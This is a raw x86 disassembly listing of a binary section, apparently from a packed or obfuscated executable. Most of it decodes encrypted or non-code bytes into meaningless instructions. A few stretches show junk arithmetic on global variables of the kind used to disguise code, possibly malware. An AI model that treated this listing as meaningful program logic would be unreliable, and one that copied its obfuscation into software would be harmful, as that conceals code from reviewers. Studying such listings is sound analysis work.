  403154:	add    edx,DWORD PTR ds:0x42290e
  40315a:	mov    DWORD PTR ds:0x42293e,edx
  403160:	sbb    edx,0x27b8
  403166:	movzx  edx,BYTE PTR ds:0x422902
  40316d:	or     edx,DWORD PTR ds:0x422912
  403173:	mov    DWORD PTR ds:0x422902,edx
  403179:	mov    ecx,DWORD PTR ds:0x422298
  40317f:	mov    edx,DWORD PTR ds:0x4229ee
  403185:	mov    edx,DWORD PTR [edx]
  403187:	xor    DWORD PTR ds:0x4228be,edx
  40318d:	lea    eax,[eax+ecx*1-0x27d2]
  403194:	jmp    0x40371e
  403199:	out    0x30,al
  40319b:	dec    BYTE PTR [edi+0x18661839]
  4031a1:	lock push 0xc7bb72b2
  4031a7:	sub    BYTE PTR [eax-0xc],ch
  4031aa:	loope  0x4031c2
  4031ac:	push   ss
  4031ad:	cmp    eax,0xa3161604
  4031b2:	xchg   ebx,eax
  4031b3:	fwait
  4031b4:	push   ds
  4031b5:	mov    edx,0xfbe8b524
  4031ba:	loopne 0x4031d6
  4031bc:	aam    0x33
  4031be:	cmp    ebp,DWORD PTR [edi+0x57f2dbb8]
  4031c4:	jbe    0x403229
  4031c6:	popf   
  4031c7:	test   DWORD PTR [ebp-0x7551a900],esi
  4031cd:	loop   0x40321e
  4031cf:	mov    bl,0xe3
  4031d1:	and    esp,DWORD PTR [edi]
  4031d3:	jp     0x40317c
  4031d5:	mov    esi,0x382b7319
  4031da:	mov    ds:0xc15a0f51,eax
  4031df:	cmp    al,0x2c
  4031e1:	push   sp
  4031e3:	js     0x4031b5
  4031e5:	cli    
  4031e6:	(bad)  
  4031e7:	in     eax,dx
  4031e8:	stos   BYTE PTR es:[edi],al
  4031e9:	inc    ebx
  4031ea:	mov    esi,0x3648de78
  4031ef:	int3   
  4031f0:	jo     0x403208
  4031f2:	repz sub esi,DWORD PTR [eiz*1-0x2b14dfe3]
  4031fa:	js     0x40325e
  4031fc:	int3   
  4031fd:	setl   BYTE PTR [esi-0x77]
  403201:	sbb    DWORD PTR [ecx],0x8278c773
  403207:	jbe    0x4031a5
  403209:	shl    bl,0x98
  40320c:	loop   0x403249
  40320e:	pusha  
  40320f:	lds    esp,FWORD PTR [ebx-0x3733a6a]
  403215:	add    DWORD PTR [ebx+ebx*8+0x5a841e2b],edx
  40321c:	push   ecx
  40321d:	ja     0x403256
  40321f:	stos   DWORD PTR es:[edi],eax
  403220:	dec    ebx
  403221:	jge    0x40325d
  403223:	ja     0x4031e0
  403225:	cmp    BYTE PTR [edi+0x732e3cc5],ah
  40322b:	or     al,ch
  40322d:	mov    esp,0xf25cf89f
  403232:	add    BYTE PTR [edx],dl
  403234:	push   esi
  403235:	jmp    0x39a9488
  40323a:	in     eax,0x2b
  40323c:	ds push ebp
  40323e:	cmp    esi,DWORD PTR [eax+0x45a9eeb9]
  403244:	mov    esp,0x14dd5de9
  403249:	mov    bl,0xf1
  40324b:	out    0xff,al
  40324d:	dec    ecx
  40324e:	aas    
  40324f:	add    esp,ebx
  403251:	push   esi
  403252:	out    0xcc,al
  403254:	xor    ah,al
  403256:	ret    0xb105
  403259:	xlat   BYTE PTR ds:[ebx]
  40325a:	lahf   
  40325b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40325c:	dec    eax
  40325d:	iret   
  40325e:	add    bh,BYTE PTR [esi]
  403260:	jns    0x40329d
  403262:	pop    ds
  403263:	cs mov cl,0x37
  403266:	out    0xa9,eax
  403268:	ins    BYTE PTR es:[edi],dx
  403269:	aam    0x5c
  40326b:	push   ebx
  40326c:	stos   BYTE PTR es:[edi],al
  40326d:	inc    esp
  40326e:	inc    esp
  40326f:	inc    esp
  403270:	cmp    BYTE PTR [edi+0x3ec61cf7],ah
  403276:	loop   0x40322b
  403278:	push   eax
  403279:	sub    DWORD PTR [ebx],ecx
  40327b:	popf   
  40327c:	jnp    0x403208
  40327e:	call   0xb9a:0x7954d24b
  403285:	mov    dl,0xc
  403287:	dec    eax
  403288:	stos   BYTE PTR es:[edi],al
  403289:	out    dx,al
  40328a:	sbb    BYTE PTR [edi+esi*8+0x39],ah
  40328e:	rcr    DWORD PTR [esi+0x28],1
  403291:	leave  
  403292:	adc    eax,0x8d2f6f06
  403297:	(bad)
  40329a:	jp     0x40330e
  40329c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40329d:	mov    cl,0x0
  40329f:	cdq    
  4032a0:	adc    eax,0xb22884b6
  4032a5:	jb     0x4032d1
  4032a7:	pushf  
  4032a8:	neg    DWORD PTR [esi]
  4032aa:	call   0x4522bb71
  4032af:	and    al,0x4e
  4032b1:	pop    eax
  4032b2:	push   edx
  4032b3:	xor    DWORD PTR fs:[edx],esi
  4032b6:	cmc    
  4032b7:	dec    eax
  4032b8:	fs inc ecx
  4032ba:	loop   0x403321
  4032bc:	stos   DWORD PTR es:[edi],eax
  4032bd:	into   
  4032be:	pop    edi
  4032bf:	fcomp  DWORD PTR [ecx]
  4032c1:	out    dx,al
  4032c2:	and    al,0xc
  4032c4:	push   edi
  4032c5:	(bad)  
  4032c6:	add    eax,0xf0c3d497
  4032cb:	dec    ebx
  4032cc:	test   eax,0xe807c042
  4032d1:	xor    DWORD PTR [ebx+0x5c319864],ebx
  4032d7:	jge    0x403262
  4032d9:	hlt    
  4032da:	push   eax
  4032db:	or     BYTE PTR [edx+0x3f],al
  4032de:	fist   WORD PTR [ebp-0x61]
  4032e1:	imul   edi,DWORD PTR [eax-0x7d94787e],0xffffff9b
  4032e8:	dec    ebp
  4032e9:	push   es
  4032ea:	iret   
  4032eb:	aam    0xa9
  4032ed:	sub    al,0x55
  4032ef:	shl    BYTE PTR [edi+0x79],1
  4032f2:	stos   BYTE PTR es:[edi],al
  4032f3:	test   bl,dl
  4032f5:	or     ebx,ebp
  4032f7:	fidivr WORD PTR [edx+0x6902d2f]
  4032fd:	pop    ebx
  4032fe:	and    eax,0x47ad3f28
  403303:	popf   
  403304:	stc    
  403305:	inc    edi
  403306:	sbb    BYTE PTR [eax+0x14bd722c],cl
  40330c:	fcomp  DWORD PTR [eax-0x2b599aa5]
  403312:	dec    ebx
  403313:	rsm    
  403315:	mov    BYTE PTR [edx+0x29],dh
  403318:	(bad)  [ecx+0x58b28a13]
  40331e:	mul    esp
  403320:	(bad)  
  403321:	outs   dx,BYTE PTR ds:[esi]
  403322:	aaa    
  403323:	xor    al,0xcf
  403325:	adc    esp,ebp
  403327:	cld    
  403328:	push   edi
  403329:	push   ebp
  40332a:	into   
  40332b:	sub    ah,BYTE PTR [edi+0x8]
  40332e:	ret    0x3e28
  403331:	mov    al,ds:0x9d8bb6cb
  403336:	cmc    
  403337:	sbb    al,0x1b
  403339:	outs   dx,BYTE PTR ds:[esi]
  40333a:	xchg   BYTE PTR [esi-0x69c8383f],ah
  403340:	int    0x8
  403342:	and    al,0x1d
  403344:	mov    ss,WORD PTR [ecx+ebp*2]
  403347:	and    al,0x50
  403349:	push   0x99bb7117
  40334e:	push   ebp
  40334f:	daa    
  403350:	cmc    
  403351:	xchg   BYTE PTR [eax-0x11],cl
  403354:	lds    eax,FWORD PTR [ecx+ebp*1-0x14]
  403358:	add    ecx,DWORD PTR ds:0xb771495d
  40335e:	mov    BYTE PTR [ecx-0x651d4c4],dl
  403364:	or     DWORD PTR [edx-0x8],esp
  403367:	test   DWORD PTR [edx+edx*4+0x5c],edi
  40336b:	sub    al,0x23
  40336d:	add    al,0xd1
  40336f:	lods   al,BYTE PTR ds:[esi]
  403370:	jp     0x4033d5
  403372:	out    0x3,eax
  403374:	in     al,dx
  403375:	cmp    al,0xe1
  403377:	repnz loopne 0x4033c2
  40337a:	mov    ah,0x1
  40337c:	sub    dh,bh
  40337e:	pop    eax
  40337f:	xor    BYTE PTR [ecx-0x6fbf91d8],0xaa
  403386:	stc    
  403387:	jmp    0x7bede324
  40338c:	jns    0x4033f1
  40338e:	popa   
  40338f:	push   ecx
  403390:	sub    DWORD PTR [ebp-0x61f765dc],ebp
  403396:	dec    esp
  403397:	jno    0x4033e8
  403399:	es ret 0x81e6
  40339d:	cmc    
  40339e:	bound  edi,QWORD PTR [esi-0x52]
  4033a1:	fist   WORD PTR [edi]
  4033a3:	ja     0x40332c
  4033a5:	cdq    
  4033a6:	and    al,ch
  4033a8:	dec    esi
  4033a9:	xor    eax,0xd3099dd5
  4033ae:	mov    DWORD PTR [esp+esi*1-0x7a650663],ecx
  4033b5:	ror    DWORD PTR [esi-0x486dc9bf],cl
  4033bb:	and    eax,0x796d0472
  4033c0:	mov    dh,0xea
  4033c2:	push   cs
  4033c3:	or     al,0xe4
  4033c5:	mov    ds:0x28b61c8c,al
  4033ca:	pop    esp
  4033cb:	and    dl,BYTE PTR [ecx-0x6d810077]
  4033d1:	shr    DWORD PTR [esi+edx*8-0x5e],cl
  4033d5:	aad    0xc0
  4033d7:	mov    al,ds:0xebca0002
  4033dc:	or     eax,0x3724e28b
  4033e1:	add    al,0x1e
  4033e3:	inc    cl
  4033e5:	int    0x3a
  4033e7:	adc    esi,esi
  4033e9:	or     esp,edx
  4033eb:	dec    edx
  4033ec:	add    bh,BYTE PTR [esi+0x38521b7a]
  4033f2:	push   edx
  4033f3:	frstor [eax]
  4033f5:	mov    eax,ds:0x7750f400
  4033fa:	sub    DWORD PTR ds:[edi],0xffffff95
  4033fe:	push   ebx
  4033ff:	fsub   QWORD PTR [edi-0x6c]
  403402:	shl    DWORD PTR [ebp+0x750632e],cl
  403408:	aad    0x13
  40340a:	sub    esp,edi
  40340c:	jmp    0x4fd6:0x80484c55
  403413:	test   eax,0xe180dcb3
  403418:	push   ecx
  403419:	int    0xb6
  40341b:	pop    ss
  40341c:	std    
  40341d:	(bad)  
  40341f:	pop    edi
  403420:	loop   0x4033ab
  403422:	cmp    BYTE PTR [edi-0x772d48e1],cl
  403428:	jb     0x403445
  40342a:	fld    DWORD PTR [edx-0x5c]
  40342d:	mov    edx,0x6b8ce7b6
  403432:	(bad)  
  403433:	sbb    DWORD PTR [ecx+0x9a0ff0],esp
  403439:	out    dx,eax
  40343a:	addr16 inc ebx
  40343c:	fld    QWORD PTR [edi]
  40343e:	mov    esi,0x6c9d2364
  403443:	sub    edx,DWORD PTR ds:0xc83df46d
  403449:	mov    esp,0x450a694f
  40344e:	inc    eax
  40344f:	xor    al,0x93
  403451:	out    0xe8,eax
  403453:	mov    ebx,0x9fcebbb
  403458:	ins    BYTE PTR es:[edi],dx
  403459:	add    eax,0x896101fd
  40345e:	lock xor al,0xd5
  403461:	gs xchg ebp,eax
  403463:	fmul   QWORD PTR [esi-0x59]
  403466:	mov    dl,0x14
  403468:	cld    
  403469:	in     al,0xb9
  40346b:	or     esp,DWORD PTR [edi+0x47]
  40346e:	scas   al,BYTE PTR es:[edi]
  40346f:	lods   al,BYTE PTR ds:[esi]
  403470:	push   cs
  403471:	mov    al,0x45
  403473:	stos   BYTE PTR es:[edi],al
  403474:	sbb    BYTE PTR [esi-0x19fbe538],ah
  40347a:	retf   
  40347b:	sbb    BYTE PTR [eax+0x5d],0xa1
  40347f:	push   edi
  403480:	loopne 0x403470
  403482:	cli    
  403483:	mov    eax,ds:0x238c82bc
  403488:	mov    bh,0x21
  40348a:	sbb    DWORD PTR [ebp-0x76],ebp
  40348d:	in     eax,0x6c
  40348f:	aas    
  403490:	push   0x7d83297d
  403495:	repz cli 
  403497:	mov    esi,0x41e64e75
  40349c:	mov    dh,0x6b
  40349e:	ficom  WORD PTR cs:[edx-0x52]
  4034a2:	pop    ds
  4034a3:	sub    BYTE PTR [esi+0x491cceda],bh
  4034a9:	pop    ecx
  4034aa:	leave  
  4034ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034ac:	mov    ?,eax
  4034ae:	aaa    
  4034af:	pop    es
  4034b0:	stos   DWORD PTR es:[edi],eax
  4034b1:	fwait
  4034b2:	mov    al,BYTE PTR [ecx]
  4034b4:	fcomp  DWORD PTR [esi-0x76]
  4034b7:	adc    BYTE PTR [eax],0xc6
  4034ba:	mov    edi,0xa532aa24
  4034bf:	sub    ebp,edi
  4034c1:	les    edx,FWORD PTR [ecx]
  4034c3:	fdiv   QWORD PTR [eax-0x76]
  4034c6:	jns    0x403493
  4034c8:	call   0x81161733
  4034cd:	outs   dx,DWORD PTR ds:[esi]
  4034ce:	or     BYTE PTR cs:[edx],ah
  4034d1:	lahf   
  4034d2:	jp     0x40345d
  4034d4:	add    BYTE PTR [edi+0x6a06c5c5],bl
  4034da:	iret   
  4034db:	popf   
  4034dc:	cmp    esi,DWORD PTR [ecx+edx*1+0x6]
  4034e0:	fs out dx,eax
  4034e2:	inc    ecx
  4034e3:	aas    
  4034e4:	xchg   esp,eax
  4034e5:	test   BYTE PTR [eax],ch
  4034e7:	or     DWORD PTR [edx],edi
  4034e9:	inc    eax
  4034ea:	and    dh,dl
  4034ec:	add    eax,0xa7283448
  4034f1:	push   esp
  4034f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034f3:	dec    ebx
  4034f4:	clc    
  4034f5:	popf   
  4034f6:	les    edx,FWORD PTR [ebx-0x2b]
  4034f9:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4034fb:	mov    dh,0xd3
  4034fd:	int    0x22
  4034ff:	or     al,0x5a
  403501:	push   ecx
  403502:	inc    eax
  403503:	push   ds
  403504:	retf   0xd50a
  403507:	(bad)  
  403508:	jb     0x4034f5
  40350a:	push   edx
  40350b:	sti    
  40350c:	mov    ds:0xe995038e,eax
  403511:	retf   0x143a
  403514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403515:	clc    
  403516:	imul   edi,esi,0xffffffff
  403519:	fld    DWORD PTR [ecx-0x1d]
  40351c:	popf   
  40351d:	repz sbb esi,DWORD PTR [ebp+0x7289ab31]
  403524:	push   ss
  403525:	daa    
  403526:	jno    0x4034bc
  403528:	add    esi,DWORD PTR [edi-0x6f]
  40352b:	jg     0x4034f1
  40352d:	vpaddq ymm5,ymm4,YMMWORD PTR [ebp+0x74d51311]
  403535:	jne    0x40355f
  403537:	fs or  al,0x72
  40353a:	jp     0x4034f0
  40353c:	xchg   esi,eax
  40353d:	and    DWORD PTR [ebx-0x74817e38],esp
  403543:	pop    ss
  403544:	in     eax,dx
  403545:	push   esp
  403546:	jno    0x403530
  403548:	add    BYTE PTR [ecx],dh
  40354a:	inc    ecx
  40354b:	retf   
  40354c:	fnstenv [esi+0x51]
  40354f:	ret    0x2137
  403552:	scas   al,BYTE PTR es:[edi]
  403553:	call   0xa69e:0x2a994ac0
  40355a:	mov    ebp,0xadce3018
  40355f:	adc    esp,DWORD PTR [ebx-0x32]
  403562:	add    BYTE PTR [esp+esi*1],ch
  403565:	ror    eax,1
  403567:	test   al,0x7a
  403569:	cmp    BYTE PTR ds:0xda8e81c6,dl
  40356f:	out    0xab,eax
  403571:	out    0xd7,eax
  403573:	xchg   ebx,eax
  403574:	or     al,0x66
  403576:	popf   
  403577:	cmp    al,0x2c
  403579:	pop    ecx
  40357a:	or     eax,0xf2d250f7
  40357f:	out    dx,al
  403580:	aad    0xa5
  403582:	mov    BYTE PTR [esi],dh
  403584:	add    dl,al
  403586:	pop    ecx
  403587:	jmp    0x4035ef
  403589:	add    dh,BYTE PTR gs:[eax-0x5a]
  40358d:	cmp    cl,BYTE PTR [ecx-0x87c1d8e]
  403593:	mov    esp,0x5011b649
  403598:	sbb    eax,0xb8241f1e
  40359d:	rol    DWORD PTR [ebx],cl
  40359f:	or     eax,0x3f4b3bd5
  4035a4:	mov    ch,0x5
  4035a6:	add    cl,BYTE PTR [edx-0x38]
  4035a9:	xor    ah,BYTE PTR [esi]
  4035ab:	cmp    BYTE PTR [eax+edi*1-0x4ca0df5a],ch
  4035b2:	mov    ds,ebx
  4035b4:	sar    DWORD PTR [eax],0x56
  4035b7:	fsub   QWORD PTR [edx-0x20489a2f]
  4035bd:	cmp    esi,DWORD PTR [edi+0x44]
  4035c0:	ss cs and bl,dh
  4035c4:	and    ch,BYTE PTR ds:0x64fda81d
  4035ca:	leave  
  4035cb:	xor    al,0x9f
  4035cd:	push   ebp
  4035ce:	(bad)  
  4035cf:	xlat   BYTE PTR ds:[ebx]
  4035d0:	call   0x160f:0xbb3c6f8
  4035d7:	inc    ebx
  4035d8:	(bad)  
  4035d9:	adc    BYTE PTR [ebx],ch
  4035db:	pushf  
  4035dc:	push   es
  4035dd:	add    BYTE PTR [ebp+0x7d6708f3],ch
  4035e3:	imul   ebp,ebp,0xb0751495
  4035e9:	into   
  4035ea:	aas    
  4035eb:	push   edi
  4035ec:	mov    esp,0x6950ef58
  4035f1:	lea    eax,ds:0x62115ea8
  4035f7:	mov    bh,0x37
  4035f9:	mov    dh,0x40
  4035fb:	mov    al,ds:0x3506a606
  403600:	bound  edx,QWORD PTR [ecx+edi*4]
  403603:	cmp    bl,BYTE PTR [eax-0x2a]
  403606:	in     al,0xc8
  403608:	sbb    dl,BYTE PTR [ebx+0x5d7915d7]
  40360e:	pop    ss
  40360f:	inc    edx
  403610:	imul   esp,DWORD PTR [esi+eiz*2],0xc1b80cd5
  403617:	or     al,0x9e
  403619:	mov    esi,DWORD PTR [ebx]
  40361b:	xchg   edx,eax
  40361c:	popa   
  40361d:	sub    al,0x63
  40361f:	xchg   ebx,eax
  403620:	fdiv   QWORD PTR ds:0xf9dbcd0f
  403626:	dec    esi
  403627:	and    eax,0x994b404c
  40362c:	lds    esi,FWORD PTR [edx-0x4f]
  40362f:	jno    0x40363f
  403631:	inc    esp
  403632:	stos   DWORD PTR es:[edi],eax
  403633:	adc    ebx,esi
  403635:	pop    eax
  403636:	sub    eax,0x3e465fbf
  40363b:	jno    0x403613
  40363d:	cmc    
  40363e:	stos   BYTE PTR es:[edi],al
  40363f:	jle    0x40368f
  403641:	(bad)  
  403642:	mov    esi,0x2b25da72
  403647:	test   eax,0x89a9d34b
  40364c:	jne    0x4036a7
  40364e:	leave  
  40364f:	arpl   WORD PTR [ebx+0xa],sp
  403652:	add    ecx,DWORD PTR [ebx-0x73358e9d]
  403658:	scas   eax,DWORD PTR es:[edi]
  403659:	sbb    DWORD PTR [edx-0x72],esi
  40365c:	jecxz  0x403600
  40365e:	adc    eax,0xb01672db
  403663:	jecxz  0x40362d
  403665:	lea    ebp,[edx+0x3a]
  403668:	hlt    
  403669:	repz jmp 0x16e6181c
  40366f:	or     dh,bl
  403671:	jecxz  0x40363b
  403673:	cs lock pop ds
  403676:	push   0xffffffc3
  403678:	xor    eax,edi
  40367a:	icebp  
  40367b:	mov    dl,0xff
  40367d:	push   ss
  40367e:	adc    edx,DWORD PTR [edi+0x6e72c1d0]
  403684:	push   ebp
  403685:	adc    BYTE PTR ds:0x1925b1a5,dh
  40368b:	pop    ss
  40368c:	add    BYTE PTR [eax],0x61
  40368f:	ret    0x725
  403692:	push   eax
  403693:	popf   
  403694:	xor    DWORD PTR [eax-0x6a670ddf],0x43
  40369b:	test   DWORD PTR [edx-0x25],ecx
  40369e:	int3   
  40369f:	cwde   
  4036a0:	fcomp  QWORD PTR [edi+0x535257d5]
  4036a6:	jns    0x403702
  4036a8:	ret    0xbbbc
  4036ab:	clc    
  4036ac:	jmp    0x42e02a31
  4036b1:	icebp  
  4036b2:	rol    DWORD PTR [ebp+0x7a],cl
  4036b5:	pop    esi
  4036b6:	mov    edx,0x5857a5d7
  4036bb:	mov    ah,0x16
  4036bd:	dec    esp
  4036be:	aas    
  4036bf:	sbb    ecx,ebx
  4036c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036c2:	xchg   edi,eax
  4036c3:	leave  
  4036c4:	pop    esi
  4036c5:	add    bh,al
  4036c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036c8:	sbb    eax,0x950d46fa
  4036cd:	popf   
  4036ce:	(bad)  
  4036cf:	fldenv [edi]
  4036d1:	dec    ecx
  4036d2:	mov    esi,0xac2fcf78
  4036d7:	push   esi
  4036d8:	jmp    0x8d1a5f2b
  4036dd:	jae    0x4036c5
  4036df:	add    dh,BYTE PTR [esi]
  4036e1:	scas   al,BYTE PTR es:[edi]
  4036e2:	xchg   edi,eax
  4036e3:	sti    
  4036e4:	push   eax
  4036e5:	dec    ecx
  4036e6:	imul   edi,ecx,0xffffffc9
  4036e9:	loopne 0x40366c
  4036eb:	out    0x25,eax
  4036ed:	lods   al,BYTE PTR ds:[esi]
  4036ee:	inc    esp
  4036ef:	or     eax,0x27074c73
  4036f4:	add    bl,BYTE PTR [ebx-0x7]
  4036f7:	loope  0x4036ec
  4036f9:	rcl    edx,1
  4036fb:	adc    eax,0x6acea5e1
  403700:	inc    edi
  403701:	adc    al,0xa1
  403703:	jecxz  0x4036eb
  403705:	jg     0x4036cc
  403707:	sbb    al,0x73
  403709:	add    esp,0x4ef36637
  40370f:	lods   al,BYTE PTR ds:[esi]
  403710:	cmp    al,0x45
  403712:	xrelease xchg DWORD PTR [esi+0x28fd3e1a],ebx
  403719:	sbb    ah,BYTE PTR [ebx]
  40371b:	sbb    eax,ebx
  40371d:	imul   ecx,DWORD PTR [ebx+0x3d83e44d],0x1a
  403724:	sub    DWORD PTR [edx+0x0],eax
  403727:	add    bh,dh
  403729:	adc    eax,0x42292a
  40372e:	mov    edx,0x5d13
  403733:	movzx  edx,WORD PTR ds:0x42288a
  40373a:	jmp    0x403780
  40373f:	mov    DWORD PTR ds:0x4229aa,0xf15
  403749:	jg     0x40376e
  40374f:	push   DWORD PTR [ebp-0xc]
  403752:	call   DWORD PTR ds:0x42a174
  403758:	add    DWORD PTR ds:0x4228d2,ebx
  40375e:	xor    DWORD PTR ds:0x42296a,edi
  403764:	sub    DWORD PTR ds:0x4228ea,0x49b7
  40376e:	sub    edx,DWORD PTR ds:0x4228ca
  403774:	or     DWORD PTR ds:0x4228ce,edi
  40377a:	xor    DWORD PTR ds:0x4228f2,ebx
  403780:	mov    edx,DWORD PTR [ebp-0x2c]
  403783:	or     DWORD PTR ds:0x422942,0x4409
  40378d:	or     ecx,0x4f00
  403793:	and    ecx,edx
  403795:	mov    edx,DWORD PTR ds:0x422892
  40379b:	adc    edx,DWORD PTR ds:0x4229b6
  4037a1:	mov    DWORD PTR ds:0x422892,edx
  4037a7:	mov    edx,DWORD PTR [ebp-0x34]
  4037aa:	adc    DWORD PTR ds:0x4229b2,0x1e82
  4037b4:	or     ecx,edx
  4037b6:	adc    DWORD PTR ds:0x4228ba,0x5785
  4037c0:	xor    ecx,0x5fdd
  4037c6:	cmp    ecx,DWORD PTR [eax]
  4037c8:	jne    0x41a17f
  4037ce:	and    DWORD PTR ds:0x42297a,0x68cd
  4037d8:	mov    ecx,DWORD PTR [esi]
  4037da:	sub    DWORD PTR ds:0x42297a,0x1779
  4037e4:	mov    eax,DWORD PTR [esi+0x4]
  4037e7:	and    edx,0xf6b
  4037ed:	shrd   ecx,eax,0x2
  4037f1:	shr    eax,0x2
  4037f4:	sbb    edx,DWORD PTR ds:0x4228e2
  4037fa:	mov    eax,DWORD PTR [esi]
  4037fc:	and    edx,DWORD PTR ds:0x4229d2
  403802:	mov    edx,DWORD PTR [esi+0x4]
  403805:	shl    eax,0x1e
  403808:	add    DWORD PTR ds:0x4229ae,0x4229ca
  403812:	xor    ecx,edi
  403814:	sub    DWORD PTR ds:0x42292a,0x2cc5
  40381e:	jmp    0x403da8
  403823:	add    al,0xf4
  403825:	sbb    al,0x30
  403827:	sbb    al,0x28
  403829:	clc    
  40382a:	sbb    BYTE PTR [ecx+edi*2],ch
  40382d:	jb     0x4038a1
  40382f:	xlat   BYTE PTR ds:[ebx]
  403830:	mov    bh,0x20
  403832:	je     0x403857
  403834:	xlat   BYTE PTR ds:[ebx]
  403835:	push   ss
  403836:	push   ss
  403837:	cmp    eax,0xd3161604
  40383c:	push   ebx
  40383d:	cli    
  40383e:	out    dx,eax
  40383f:	sahf   
  403840:	jmp    0x403827
  403842:	ret    0xbad3
  403845:	loop   0x4037ef
  403847:	test   al,0x90
  403849:	dec    ebp
  40384a:	xchg   esp,eax
  40384b:	sbb    al,0xcc
  40384d:	lea    ebp,[edi+0x7b]
  403850:	aas    
  403851:	ret    0x8ebc
  403854:	scas   al,BYTE PTR es:[edi]
  403855:	jg     0x4037e2
  403857:	adc    al,0xb0
  403859:	daa    
  40385a:	sub    ah,BYTE PTR [ebx]
  40385c:	shl    DWORD PTR [edi+0x6f],0xd9
  403860:	add    BYTE PTR [edx],0x99
  403863:	adc    DWORD PTR [edi+0x30],edx
  403866:	sub    eax,0x6dd962d3
  40386b:	mov    eax,ds:0xd93d035f
  403870:	loopne 0x4038a5
  403872:	sub    BYTE PTR [eax],dl
  403874:	cdq    
  403875:	xlat   BYTE PTR ss:[ebx]
  403877:	pop    edi
  403878:	xchg   esi,eax
  403879:	mov    cl,0xdb
  40387b:	scas   al,BYTE PTR es:[edi]
  40387c:	das    
  40387d:	mov    ch,BYTE PTR [esp+edx*2]
  403880:	sahf   
  403881:	aam    0x12
  403883:	retf   
  403884:	ins    BYTE PTR es:[edi],dx
  403885:	fbstp  TBYTE PTR [eax-0x39d8250]
  40388b:	cmp    eax,0x25166a8c
  403890:	cli    
  403891:	inc    esi
  403892:	cdq    
  403893:	push   ebx
  403894:	scas   al,BYTE PTR es:[edi]
  403895:	xchg   DWORD PTR [ebx],edx
  403897:	inc    esi
  403898:	(bad)
  40389b:	mov    eax,DWORD PTR [ecx]
  40389d:	mov    eax,ds:0x234e29e2
  4038a2:	push   eax
  4038a3:	push   es
  4038a4:	push   cs
  4038a5:	or     al,0x5e
  4038a7:	popf   
  4038a8:	cmp    DWORD PTR [eax],ecx
  4038aa:	repnz and edx,DWORD PTR [edx]
  4038ad:	and    BYTE PTR [eax+0x7da244cd],al
  4038b3:	daa    
  4038b4:	aad    0xde
  4038b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038b7:	jb     0x4038ce
  4038b9:	fidivr WORD PTR [esi]
  4038bb:	scas   eax,DWORD PTR es:[edi]
  4038bc:	push   ebx
  4038bd:	jbe    0x40391d
  4038bf:	cmp    DWORD PTR [edx+0x59],0x7
  4038c3:	(bad)  
  4038c4:	cmc    
  4038c5:	ins    BYTE PTR es:[edi],dx
  4038c6:	dec    esp
  4038c7:	sar    eax,0x76
  4038ca:	stos   BYTE PTR es:[edi],al
  4038cb:	popf   
  4038cc:	mov    ds:0xcb922fd7,eax
  4038d1:	push   0x46
  4038d3:	pop    ds
  4038d4:	xor    BYTE PTR [eax],0x3a
  4038d7:	jno    0x40386b
  4038d9:	cmp    dl,BYTE PTR [ebx]
  4038db:	imul   edi,esi,0x1c
  4038de:	xchg   BYTE PTR [eax+edx*1],cl
  4038e1:	dec    esp
  4038e2:	ds aas 
  4038e4:	pusha  
  4038e5:	scas   al,BYTE PTR es:[edi]
  4038e6:	std    
  4038e7:	mov    WORD PTR [edx],?
  4038e9:	sub    DWORD PTR [ecx+esi*2+0x6e60d220],eax
  4038f0:	pop    eax
  4038f1:	mov    esi,0x6dcb7679
  4038f6:	jle    0x4038bc
  4038f8:	cmp    bh,bl
  4038fa:	pop    ds
  4038fb:	ins    BYTE PTR es:[edi],dx
  4038fc:	xor    bl,ch
  4038fe:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403900:	out    0x14,eax
  403902:	cmp    eax,0x49f624a7
  403907:	sbb    eax,0x58c32b92
  40390c:	inc    edx
  40390d:	mov    ebp,0xd40f5de
  403912:	xchg   esp,eax
  403913:	dec    ebx
  403914:	ins    DWORD PTR es:[edi],dx
  403915:	arpl   WORD PTR [ebx-0xff6aa83],bp
  40391b:	repnz and al,0x58
  40391e:	(bad)  
  40391f:	stos   DWORD PTR es:[edi],eax
  403920:	push   ds
  403921:	or     BYTE PTR [edi+edi*8+0x317e6112],ah
  403928:	dec    eax
  403929:	lods   al,BYTE PTR ds:[esi]
  40392a:	dec    edx
  40392b:	cs sbb eax,0x7063c0ae
  403931:	mov    ah,0xd4
  403933:	jae    0x40394b
  403935:	jp     0x403932
  403937:	ss ret 
  403939:	push   esi
  40393a:	fwait
  40393b:	mov    ebp,0x817d1a5e
  403940:	fild   QWORD PTR [eax]
  403942:	retf   
  403943:	rcl    DWORD PTR [ecx],1
  403945:	push   ebp
  403946:	mov    eax,eax
  403948:	dec    ecx
  403949:	ja     0x403967
  40394b:	sub    al,0x2c
  40394d:	pop    esi
  40394e:	imul   edi,DWORD PTR [esi+edi*1+0x12cdb559],0x2d
  403956:	ret    0x428b
  403959:	adc    bh,BYTE PTR [ebx+esi*4]
  40395c:	bnd jnp 0x4039db
  40395f:	into   
  403960:	dec    eax
  403961:	dec    edi
  403962:	or     DWORD PTR [eax],ecx
  403964:	xlat   BYTE PTR ds:[ebx]
  403965:	mov    ebp,DWORD PTR [edi-0x56]
  403968:	inc    ecx
  403969:	jmp    0xba6:0x983b7e7c
  403970:	fcmovnbe st,st(6)
  403972:	jmp    0x4235098b
  403977:	int3   
  403978:	retf   0x7a6e
  40397b:	aad    0x82
  40397d:	dec    ebp
  40397e:	xor    al,BYTE PTR [ecx]
  403980:	cmp    ah,BYTE PTR [esi-0x49]
  403983:	xor    eax,0x1c1cf092
  403988:	test   BYTE PTR [eax+0x6f],bl
  40398b:	loop   0x403973
  40398d:	push   ds
  40398e:	push   edx
  40398f:	jle    0x4039c7
  403991:	jne    0x4039af
  403993:	push   es
  403994:	inc    eax
  403995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403996:	dec    ebp
  403997:	pop    esi
  403998:	xor    eax,0x2b6178cd
  40399d:	add    al,0xb8
  40399f:	sbb    DWORD PTR [eax],0x627a54c
  4039a5:	mov    al,ds:0x6ac82d43
